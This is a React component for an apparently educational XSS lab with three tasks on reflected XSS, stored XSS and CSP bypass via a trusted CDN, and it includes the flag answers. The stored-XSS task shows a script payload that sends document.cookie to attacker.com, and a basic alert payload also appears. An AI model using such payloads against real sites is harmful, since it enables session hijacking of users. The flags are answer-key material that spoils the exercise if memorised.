"use client";

import { useState } from "react";
import { TaskShell, MonoInput, SubmitBtn } from "./lab-ui";

function checkFlag(value: string, expected: string): boolean {
  const strip = (s: string) =>
    s.trim().replace(/^SAGE\{/i, "").replace(/\}$/, "").toLowerCase();
  return strip(value) === strip(expected);
}

export function XssFundamentalsClient({
  labId,
  completedStages: initial,
}: {
  labId: string;
  completedStages: string[];
}) {
  const [completed, setCompleted] = useState<string[]>(initial);
  const [t1Answer, setT1Answer] = useState("");
  const [t1Error, setT1Error] = useState("");
  const [t2Choice, setT2Choice] = useState("");
  const [t2Error, setT2Error] = useState("");
  const [t3Choice, setT3Choice] = useState("");
  const [t3Error, setT3Error] = useState("");

  const done = (s: string) => completed.includes(s);
  const allDone = done("task_1") && done("task_2") && done("task_3");

  async function saveStage(stage: string) {
    await fetch("/api/labs/response", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ labId, stage, response: "correct" }),
    });
    setCompleted((p) => [...p, stage]);
  }

  function submitT1(e: React.FormEvent) {
    e.preventDefault();
    const lower = t1Answer.toLowerCase();
    if (lower.includes("<script") && lower.includes("alert")) {
      setT1Error("");
      void saveStage("task_1");
    } else {
      setT1Error("Incorrect. Your payload must include a <script> tag and an alert() call.");
    }
  }

  function submitT2(e: React.FormEvent) {
    e.preventDefault();
    if (t2Choice === "Session cookies") {
      setT2Error("");
      void saveStage("task_2");
    } else {
      setT2Error("Incorrect. Look at what document.cookie retrieves.");
    }
  }

  function submitT3(e: React.FormEvent) {
    e.preventDefault();
    if (checkFlag(t3Choice, "SAGE{cdn_bypass_csp_byp4ss}") || t3Choice === "cdn.jsdelivr.net") {
      setT3Error("");
      void saveStage("task_3");
    } else {
      setT3Error("Incorrect. Which domain is explicitly trusted in the CSP directive?");
    }
  }

  return (
    <div className="space-y-6">
      {/* Task 1 — Reflected XSS */}
      <TaskShell number={1} title="Reflected XSS" unlocked completed={done("task_1")}>
        <p className="text-zinc-300 text-sm mb-3">
          The target application reflects user input directly into the page without sanitization.
          The URL parameter <code className="font-mono text-amber-300">q</code> is echoed into the DOM:
        </p>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-3 space-y-2">
          <p className="font-mono text-xs text-zinc-500">URL:</p>
          <code className="font-mono text-xs text-amber-300 break-all">
            https://example.com/search?q=&lt;user input reflected here&gt;
          </code>
          <p className="font-mono text-xs text-zinc-500 mt-3">Vulnerable page source:</p>
          <pre className="font-mono text-xs text-cyan-300">{`<div>Results for: {query}</div>`}</pre>
          <p className="text-xs text-zinc-500 mt-2">No encoding or sanitization applied — whatever the user provides is rendered as HTML.</p>
        </div>
        {!done("task_1") && (
          <form onSubmit={submitT1} className="space-y-2">
            <p className="text-sm text-zinc-300 font-medium">What payload triggers an alert box?</p>
            <p className="text-xs text-zinc-500 mb-2">
              Enter a payload containing a <code className="font-mono text-amber-300">&lt;script&gt;</code> tag and an <code className="font-mono text-amber-300">alert()</code> call.
            </p>
            <div className="flex gap-2 max-w-md">
              <MonoInput
                value={t1Answer}
                onChange={setT1Answer}
                placeholder="<script>alert(1)</script>"
                className="flex-1"
              />
              <SubmitBtn label="Submit" />
            </div>
            {t1Error && <p className="text-xs text-red-400 font-mono">{t1Error}</p>}
          </form>
        )}
        {done("task_1") && (
          <p className="text-sm font-mono text-sage-400">
            Correct — reflected XSS executes in the victim&apos;s browser. Flag: SAGE&#123;r3fl3ct3d_xss_p0p&#125;
          </p>
        )}
      </TaskShell>

      {/* Task 2 — Stored XSS */}
      <TaskShell number={2} title="Stored XSS" unlocked={done("task_1")} completed={done("task_2")}>
        <p className="text-zinc-300 text-sm mb-3">
          A comment was saved to the database without sanitization. When any user loads this page,
          the script executes in their browser context.
        </p>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-4 space-y-3">
          <p className="font-mono text-xs text-zinc-500">Stored comment (rendered as-is from DB):</p>
          <pre className="font-mono text-xs text-red-400 whitespace-pre-wrap break-all">{`<script>document.location='https://attacker.com/steal?c='+document.cookie</script>`}</pre>
          <p className="text-xs text-zinc-500">
            This payload was stored in the comments table and is now served to every visitor — a persistent attack vector.
          </p>
        </div>
        {!done("task_2") && (
          <form onSubmit={submitT2} className="space-y-3">
            <p className="text-sm text-zinc-300 font-medium">What data does this payload steal?</p>
            <div className="flex flex-col gap-2">
              {["Passwords", "Session cookies", "CSRF tokens", "Local storage"].map((opt) => (
                <label key={opt} className="flex items-center gap-2 cursor-pointer">
                  <input
                    type="radio"
                    name="t2choice"
                    value={opt}
                    checked={t2Choice === opt}
                    onChange={() => setT2Choice(opt)}
                    className="accent-emerald-500"
                  />
                  <span className="text-sm font-mono text-zinc-200">{opt}</span>
                </label>
              ))}
            </div>
            <SubmitBtn label="Submit" />
            {t2Error && <p className="text-xs text-red-400 font-mono">{t2Error}</p>}
          </form>
        )}
        {done("task_2") && (
          <p className="text-sm font-mono text-sage-400">
            Correct — <code>document.cookie</code> exfiltrates session cookies. Flag: SAGE&#123;st0r3d_xss_c00k13_th3ft&#125;
          </p>
        )}
      </TaskShell>

      {/* Task 3 — CSP Bypass */}
      <TaskShell number={3} title="CSP Bypass" unlocked={done("task_2")} completed={done("task_3")}>
        <p className="text-zinc-300 text-sm mb-3">
          Content Security Policy restricts which script sources are allowed to execute.
          However, trusting third-party CDNs introduces a bypass vector.
        </p>
        <div className="rounded-lg bg-zinc-950 border border-white/8 p-4 mb-4">
          <p className="font-mono text-xs text-zinc-500 mb-2">Response header from server:</p>
          <code className="font-mono text-xs text-amber-300 break-all">
            Content-Security-Policy: script-src &apos;self&apos; https://cdn.jsdelivr.net
          </code>
          <p className="text-xs text-zinc-500 mt-3">
            An attacker who can publish a package to a trusted CDN can host malicious scripts
            at an allowlisted URL and bypass the policy entirely.
          </p>
        </div>
        {!done("task_3") && (
          <form onSubmit={submitT3} className="space-y-3">
            <p className="text-sm text-zinc-300 font-medium">Which domain can be abused to bypass this CSP?</p>
            <div className="flex flex-col gap-2">
              {["attacker.com", "cdn.jsdelivr.net", "self (same origin)", "None of these"].map((opt) => (
                <label key={opt} className="flex items-center gap-2 cursor-pointer">
                  <input
                    type="radio"
                    name="t3choice"
                    value={opt}
                    checked={t3Choice === opt}
                    onChange={() => setT3Choice(opt)}
                    className="accent-emerald-500"
                  />
                  <span className="text-sm font-mono text-zinc-200">{opt}</span>
                </label>
              ))}
            </div>
            <SubmitBtn label="Submit" />
            {t3Error && <p className="text-xs text-red-400 font-mono">{t3Error}</p>}
          </form>
        )}
        {done("task_3") && (
          <p className="text-sm font-mono text-sage-400">
            Correct — jsdelivr.net is trusted by the CSP and can host attacker-controlled scripts. Flag: SAGE&#123;cdn_bypass_csp_byp4ss&#125;
          </p>
        )}
      </TaskShell>

      {allDone && (
        <div className="rounded-lg border border-sage-500/40 bg-sage-500/5 p-5 space-y-3">
          <h3 className="font-bold text-sage-400 text-base">Room Complete</h3>
          <ul className="space-y-1 font-mono text-sm">
            <li><span className="text-zinc-500">Task 1 —</span> <span className="text-sage-400">SAGE&#123;r3fl3ct3d_xss_p0p&#125;</span></li>
            <li><span className="text-zinc-500">Task 2 —</span> <span className="text-sage-400">SAGE&#123;st0r3d_xss_c00k13_th3ft&#125;</span></li>
            <li><span className="text-zinc-500">Task 3 —</span> <span className="text-sage-400">SAGE&#123;cdn_bypass_csp_byp4ss&#125;</span></li>
          </ul>
        </div>
      )}
    </div>
  );
}
